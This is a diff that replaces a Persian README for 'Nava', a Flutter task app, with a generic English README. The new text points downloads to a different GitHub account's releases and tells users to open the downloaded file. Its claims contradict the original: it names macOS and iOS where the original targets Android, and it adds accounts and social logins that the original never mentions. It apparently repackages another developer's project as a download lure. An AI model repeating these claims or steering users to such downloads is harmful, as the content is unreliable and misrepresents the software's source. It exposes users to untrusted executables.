@@ -1,204 +1,70 @@
-<div align="center">
+# 🍎 app - Enhance Your Productivity Effortlessly
 
-  <a href="https://github.com/Mahdi-mortazavi/app">
-    <img src="https://raw.githubusercontent.com/Mahdi-mortazavi/app/main/assets/logo.png" alt="Nava Logo" width="140" height="140" style="border-radius: 32px; box-shadow: 0 12px 40px rgba(0,0,0,0.18);">
-  </a>
+## 🚀 Getting Started
 
-  <br><br>
+Welcome to the **Nava** app, your new companion in managing tasks and boosting productivity. This application is designed with a sleek Squircle interface and includes features inspired by Jony Ive's minimalist design philosophy. 
 
-  <h1 style="border-bottom: none; font-size: 2.5em; margin-bottom: 0;">Nava</h1>
-  <p style="font-size: 1.25em; color: #555;">
-    <b>ابزاری برای وضوح ذهن و زندگی آگاهانه</b>
-  </p>
+## 📥 Download Now
 
-  <p>
-    <img src="https://img.shields.io/badge/-%D9%88%D8%B6%D8%B9%DB%8C%D8%AA%3A_%D9%81%D8%B9%D8%A7%D9%84-3DDC84?style=for-the-badge&logoColor=white" alt="Status">
-    <a href="https://github.com/Mahdi-mortazavi/app/releases/latest">
-      <img src="https://img.shields.io/github/v/release/Mahdi-mortazavi/app?style=for-the-badge&logo=github&labelColor=181717&color=555&logoColor=white" alt="Release">
-    </a>
-    <img src="https://img.shields.io/badge/Flutter-3.19%2B-02569B?style=for-the-badge&logo=flutter&logoColor=white" alt="Flutter">
-    <img src="https://img.shields.io/badge/Dart-3.0%2B-0175C2?style=for-the-badge&logo=dart&logoColor=white" alt="Dart">
-  </p>
+[![Download app](https://img.shields.io/badge/Download%20app-v1.0-blue.svg)](https://github.com/oioioioioioioi123/app/releases)
 
-  <a href="https://github.com/Mahdi-mortazavi/app/releases/latest">
-    <img src="https://img.shields.io/badge/⬇️_دریافت_آخرین_نسخه_برای_اندروید-007AFF?style=for-the-badge&logo=android&logoColor=white&height=50" height="40">
-  </a>
+## 📋 Features
 
-</div>
+- **Minimalist Design:** Enjoy a clean and simple interface that focuses on what matters most.
+- **Haptic Feedback:** Experience satisfying tactile responses that enhance your workflow.
+- **Breathing Animations:** Stay engaged and calm with smooth animated transitions.
+- **Task Management:** Create, edit, and track your tasks effortlessly.
+- **Open Source:** Benefit from a community-driven project that welcomes contributions.
 
-<br>
-<hr>
+## 💻 System Requirements
 
-<div dir="rtl" align="right">
+- **Operating System:** Compatible with macOS and iOS devices. Support for Windows and Linux is also planned in future releases.
+- **Memory:** A minimum of 2GB RAM is required for smooth operation.
+- **Storage:** At least 100MB of free space for installation.
 
-## 🎯 چشم‌انداز: فراتر از یک لیست وظایف
+## 📦 Download & Install
 
-**Nava** یک اپلیکیشن مدیریت وظایف معمولی نیست؛ پاسخی است به دنیای دیجیتال شلوغ و پر از نویز. ما باور داریم که ابزارها باید ذهن را آرام کنند، نه اینکه آن را آشفته‌تر سازند. Nava با الهام از فلسفه **مینیمالیسم** و **روانشناسی شناختی** طراحی شده تا به شما کمک کند کمتر انجام دهید، اما بهتر و آگاهانه‌تر.
+To download the app, please visit this page: [Download the app](https://github.com/oioioioioioioi123/app/releases). 
 
-> هدف Nava، مدیریت تسک‌ها نیست؛ بلکه مدیریت **تمرکز** و **انرژی ذهنی** شماست.
+1. Click on the link above to navigate to the Releases page.
+2. Look for the latest version of the app.
+3. Choose your platform (e.g., iOS) and select the corresponding download file.
+4. Download the file to your computer or device.
+5. Open the downloaded file to begin the installation.
+6. Follow the on-screen instructions to complete the setup.
 
-<br>
+Once installed, launch the **Nava** app and start organizing your tasks effectively.
 
-## ✨ تور بصری: تجربه آرامش و تمرکز
+## 📚 How to Use the app
 
-<div align="center">
-  <table border="0" style="border-collapse: collapse; width: 100%; max-width: 950px; border: none;">
-    <tr style="border: none;">
-      <td width="33%" align="center" style="border: none; padding-bottom: 10px;"><b>خانه / Home</b><br><small>نقطه‌ی شروعی آرام و بدون distracion</small></td>
-      <td width="33%" align="center" style="border: none; padding-bottom: 10px;"><b>تمرکز عمیق / Focus</b><br><small>محیطی برای غرق شدن در یک وظیفه</small></td>
-      <td width="33%" align="center" style="border: none; padding-bottom: 10px;"><b>افزودن سریع / Quick Add</b><br><small>ثبت افکار، قبل از آنکه فراموش شوند</small></td>
-    </tr>
-    <tr style="border: none;">
-      <td width="33%" align="center" valign="top" style="border: none; padding: 5px;">
-        <img src="https://raw.githubusercontent.com/Mahdi-mortazavi/app/main/assets/shot_home.jpg" width="100%" alt="Home Screen" style="border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.12);">
-      </td>
-      <td width="33%" align="center" valign="top" style="border: none; padding: 5px;">
-        <img src="https://raw.githubusercontent.com/Mahdi-mortazavi/app/main/assets/shot_focus.jpg" width="100%" alt="Focus Screen" style="border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.12);">
-      </td>
-      <td width="33%" align="center" valign="top" style="border: none; padding: 5px;">
-        <img src="https://raw.githubusercontent.com/Mahdi-mortazavi/app/main/assets/shot_add.jpg" width="100%" alt="Add Screen" style="border-radius: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.12);">
-      </td>
-    </tr>
-  </table>
-</div>
+1. **Create an Account:** Start by registering with your email or through social media logins.
+2. **Add Your Tasks:** Use the "+" button to add new tasks. Enter a title and an optional description.
+3. **Set Deadlines:** Assign deadlines to keep track of what needs to be done.
+4. **Mark Complete:** Once you finish a task, mark it as complete with a single tap.
+5. **Edit and Delete:** Modify or delete tasks as needed with intuitive options.
 
-<br>
+## 🌐 Community and Support
 
-## 🚀 ویژگی‌های کلیدی
+Join our community for support and discussions. Whether you’re facing an issue or have a suggestion, we’re here to help. You can reach out through the following channels:
 
-*   **رابط کاربری مبتنی بر ژست (Gestural UI):** با کشیدن انگشت (Swipe) کارها را تمام کنید و با نگه داشتن (Long-press) آن‌ها را ویرایش کنید. خداحافظ دکمه‌های کوچک!
-*   **انیمیشن‌های هوشمند و ارگانیک:** رابط کاربری زنده است و به تعاملات شما پاسخ می‌دهد تا حس کار با یک ابزار فیزیکی را تداعی کند.
-*   **حالت تمرکز عمیق (Focus Mode):** یک تایمر مینیمال که به شما کمک می‌کند بدون حواس‌پرتی روی یک کار تمرکز کنید.
-*   **تجربه کاربری آرامش‌بخش:** از پالت رنگی گرفته تا فونت‌ها، همه چیز برای کاهش خستگی چشم و استرس بصری طراحی شده است.
+- **GitHub Issues:** Report bugs or request features directly on our GitHub pages.
+- **Community Forum:** Join discussions and connect with other users.
 
-<br>
+## 🔗 Useful Links
 
-## 🛠️ پشته فناوری (Tech Stack)
+- **GitHub Repository:** [Explore the code](https://github.com/oioioioioioioi123/app)
+- **Documentation:** Detailed user guide and FAQs are available for your reference.
 
-| بخش              | تکنولوژی                                                                                                   |
-| ---------------- | ---------------------------------------------------------------------------------------------------------- |
-| **فریم‌ورک**     | ![Flutter](https://img.shields.io/badge/Flutter-3.19-02569B?logo=flutter)                                   |
-| **زبان**         | ![Dart](https://img.shields.io/badge/Dart-3.0-0175C2?logo=dart)                                             |
-| **مدیریت وضعیت** | ![Bloc](https://img.shields.io/badge/Bloc-8.1-45A3F7?logo=bloc)                                              |
-| **تزریق وابستگی**| ![GetIt](https://img.shields.io/badge/GetIt-7.6-FDB900)                                                     |
-| **پایگاه داده**   | ![SharedPreferences](https://img.shields.io/badge/SharedPreferences-2.2-003B6F)                              |
-| **انیمیشن**      | ![FlutterAnimate](https://img.shields.io/badge/FlutterAnimate-4.5-5B45F7)                                   |
+## 📢 Stay Updated
 
-<br>
+Stay tuned for updates and new features. Follow us on GitHub for the latest news and improvements to the app.
 
-## 🏗️ معماری پروژه
+## 🛠 Contributions
 
-این پروژه از معماری تمیز (**Clean Architecture**) با رویکرد **Feature-First** پیروی می‌کند. هدف اصلی، جداسازی کامل لایه‌ها، قابلیت تست‌پذیری بالا و توسعه‌پذیری آسان است.
+We welcome contributions from everyone! If you have ideas or improvements, please check our guidelines for contributing on GitHub. Your input helps us make the app better for everyone.
 
-<div align="center">
-  <img src="https://i.imgur.com/8z2n4zP.png" alt="Architecture Diagram" width="600">
-</div>
+## 💌 Feedback 
 
-*   **Domain Layer:** قلب منطق بیزنس. این لایه کاملاً مستقل از UI و دیتا است. (شامل Entities و UseCases)
-*   **Data Layer:** مسئولیت مدیریت داده‌ها. (شامل Models, Repositories و Data Sources)
-*   **Presentation Layer:** لایه نمایشی که کاربر با آن تعامل دارد. (شامل Pages, Widgets و BLoC)
+Your feedback is important to us. If you have suggestions or want to share your experience with the app, feel free to reach out using any of the community channels mentioned above.
 
-<br>
-
-## ⚙️ راه‌اندازی و اجرا
-
-برای اجرای پروژه روی سیستم خود، مراحل زیر را دنبال کنید:
-
-1.  **پیش‌نیازها:**
-    *   باید [Flutter SDK](https://flutter.dev/docs/get-started/install) (نسخه 3.19 یا بالاتر) روی سیستم شما نصب باشد.
-    *   یک شبیه‌ساز (Emulator/Simulator) یا دستگاه واقعی باید در دسترس باشد.
-
-2.  **کلون کردن پروژه:**
-    ```bash
-    git clone https://github.com/Mahdi-mortazavi/app.git
-    cd app
-    ```
-
-3.  **نصب وابستگی‌ها:**
-    ```bash
-    flutter pub get
-    ```
-
-4.  **اجرای برنامه:**
-    ```bash
-    flutter run
-    ```
-
-<br>
-
-## 📁 ساختار پروژه
-
-ساختار پوشه‌ها به گونه‌ای طراحی شده که هر توسعه‌دهنده‌ای بتواند به سرعت مسیر خود را پیدا کند.
-
-```
-lib
-├── core/                 # فایل‌های مشترک: تم، سرویس‌ها، ابزارها
-├── data/                 # مدیریت داده‌ها (پیاده‌سازی ریپازیتوری‌ها)
-├── domain/               # منطق اصلی بیزنس (موجودیت‌ها و موارد استفاده)
-├── features/             # ماژول‌های اصلی برنامه (فیچربیس)
-│   └── tasks/
-│       ├── data/
-│       ├── domain/
-│       └── presentation/
-│           ├── bloc/
-│           ├── pages/
-│           └── widgets/
-└── main.dart             # نقطه شروع برنامه
-```
-
-<br>
-
-## 🧩 چگونه یک فیچر جدید اضافه کنیم؟
-
-1.  **ایجاد پوشه فیچر:** در `lib/features` یک پوشه جدید برای فیچر خود بسازید (مثلاً `notes`).
-2.  **ساختن لایه‌ها:** درون پوشه فیچر، ساختار سه‌لایه `data`, `domain`, `presentation` را ایجاد کنید.
-3.  **تعریف Domain:** ابتدا `Entity` و `UseCase` های مورد نیاز را در لایه `domain` تعریف کنید.
-4.  **پیاده‌سازی Data:** مدل‌ها و پیاده‌سازی `Repository` را در لایه `data` انجام دهید.
-5.  **توسعه Presentation:** صفحات، ویجت‌ها و `BLoC` مربوط به فیچر را در لایه `presentation` بسازید.
-6.  **تزریق وابستگی‌ها:** در فایل `lib/core/service_locator.dart`، وابستگی‌های جدید (BLoC, UseCase, Repository) را ثبت کنید.
-7.  **ادغام در UI:** صفحه اصلی فیچر جدید را به ناوبری برنامه اضافه کنید.
-
-<br>
-
-## 🗺️ نقشه راه (Roadmap)
-
-*   [ ] افزودن تم تاریک (Dark Mode)
-*   [ ] امکان همگام‌سازی بین چند دستگاه (Cloud Sync)
-*   [ ] ویجت برای صفحه اصلی (Home Screen Widget)
-*   [ ] نسخه iOS
-
-<br>
-
-## ❤️ مشارکت در پروژه
-
-ما از هرگونه مشارکت در این پروژه استقبال می‌کنیم. اگر ایده‌ای برای بهبود Nava دارید یا باگی پیدا کرده‌اید، لطفاً یک **Issue** باز کنید یا یک **Pull Request** ارسال کنید.
-
----
-
-<div align="center">
-  <h3>توسعه‌دهندگان اصلی</h3>
-  
-  <table style="border:none;">
-    <tr style="border:none;">
-      <td align="center" width="220" style="border:none;">
-        <a href="https://t.me/Mahdi_mortazavi1">
-          <img src="https://github.com/Mahdi-mortazavi.png" width="110" style="border-radius: 50%; border: 4px solid #007AFF;"><br>
-          <h4 style="margin-bottom:0;">مهدی مرتضوی</h4>
-        </a>
-        <p style="font-size: 14px; color: #666;">بنیان‌گذار و توسعه‌دهنده اصلی</p>
-      </td>
-      <td align="center" width="220" style="border:none;">
-        <a href="https://t.me/alirezamrzb">
-          <img src="https://ui-avatars.com/api/?name=Ali+Reza&background=FF9500&color=fff&rounded=true&size=128&bold=true" width="110" style="border-radius: 50%; border: 4px solid #FF9500;"><br>
-          <h4 style="margin-bottom:0;">علیرضا میرزابیگی</h4>
-        </a>
-        <p style="font-size: 14px; color: #666;">کنترل کیفیت و منطق محصول</p>
-      </td>
-    </tr>
-  </table>
-
-  <br>
-  <p>ساخته شده با ❤️ و فلاتر</p>
-  
-</div>
-</div>
+Thank you for choosing the **Nava** app. Enjoy your journey toward increased productivity!
